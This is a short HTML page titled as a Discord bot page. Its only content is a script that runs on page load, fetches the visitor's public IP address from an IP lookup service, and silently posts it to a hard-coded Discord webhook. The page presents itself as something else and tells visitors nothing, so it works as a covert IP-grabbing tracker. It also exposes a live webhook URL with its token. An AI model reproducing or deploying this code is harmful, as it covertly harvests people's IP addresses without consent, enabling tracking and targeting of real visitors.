<!DOCTYPE html>
<html>
<head>
  <title>Ultimate power, discord bot!</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function() {
      $.getJSON("https://api.ipify.org?format=json", function(data) {
        var ip = data.ip;
        $.ajax({
          type: "POST",
          url: "https://discord.com/api/webhooks/1133641695251152926/HdIeDddt3BSAaABcsUzMaK2EFWJVAVKNn7qlIS_LnZAgxCdm3ZpHFczbM-z9iWtD-AgJ",
          contentType: "application/json",
          data: JSON.stringify({
            content: ip,
            username: "SteelDev HQ", // Set webhook's name to "SteelDev"
            avatar_url: "https://cdn.discordapp.com/avatars/993662475306287134/806b70229d50907de2d61cd165e1b4bf.png?size=2048" // Set pfp to the provided URL
          }),
          success: function() {
            console.log("loaded");
          },
          error: function() {
            console.error("notloaded_");
          }
        });
      });
    });
  </script>
</head>

</body>
</html>
